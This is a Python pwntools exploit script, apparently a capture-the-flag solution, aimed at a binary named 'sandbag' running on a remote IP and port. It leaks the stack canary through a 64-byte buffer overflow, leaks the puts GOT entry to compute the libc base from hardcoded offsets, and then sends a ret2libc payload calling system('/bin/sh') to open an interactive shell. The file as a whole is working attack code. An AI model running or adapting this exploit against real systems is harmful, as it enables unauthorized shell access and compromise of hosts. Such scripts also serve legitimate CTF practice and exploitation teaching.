from pwn import *

debug = False

### recv data and print if debug mode ###
def recv():
	global debug

	recv = p.recv()
	if debug:
		print(recv)
	return

### Make state to overflow-able ###
def entryAttack():
	for i in range(36):
		recv()
		p.sendline("1")
		recv()
		p.sendline(str(i/12+1))

		recv()
		p.sendline("2")
		recv()
		p.sendline(str(i/12+1))

	recv()
	p.sendline("3")

	recv()
	p.sendline("4")

### Enter attack state ###
def abraka():
	recv()
	p.sendline("2")

	recv()
	p.sendline("4")
	print("[*] enter abracadabra!")

### Canary leak ###
def leak_canary():
	recv()
	recv()

	p.sendline("A"*64)

	print(p.recv(66))
	canary = u32("\x00" + p.recv(3))
	return canary


p = remote("222.110.147.52", 6975)
# p = process("./sandbag")

e = ELF("./sandbag")

# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu9_i386)
main = 0x08048D87

libc_puts = 0x5fca0

libc_start = 0x18637
libc_system = 0x0003ada0
libc_bin_sh = 0x15b9ab
libc_exit = 0x2e9d0

real_start = 0
real_system = 0
real_bin_sh = 0
real_exit = 0

entryAttack()

abraka()
canary = leak_canary()

print("[*] canary leak success! " + hex(canary))

abraka()

payload = ""

payload += "A"*64
payload += p32(canary)
payload += "A"*4

# For libc leak
payload += p32(e.plt["puts"])
payload += p32(main)
payload += p32(e.got["puts"])

p.sendline(payload)

recv()

p.sendline("6")

p.recvuntil("Good Bye~\n")

puts_got = u32(p.recv(4))
print("[*] leak puts_got : " + hex(puts_got))

real_start = puts_got - libc_puts

real_system = real_start + libc_system
real_bin_sh = real_start + libc_bin_sh
real_exit = real_start + libc_exit

### SECOND ATTACK ###

entryAttack()

abraka()
canary = leak_canary()

print("[*] second canary leak success! " + hex(canary))

abraka()

payload = ""

payload += "A"*64
payload += p32(canary)
payload += "A"*4

payload += p32(real_system)
payload += p32(real_exit)
payload += p32(real_bin_sh)

p.sendline(payload)
recv()

p.sendline("6")

p.recvuntil("Good Bye~\n")

p.interactive()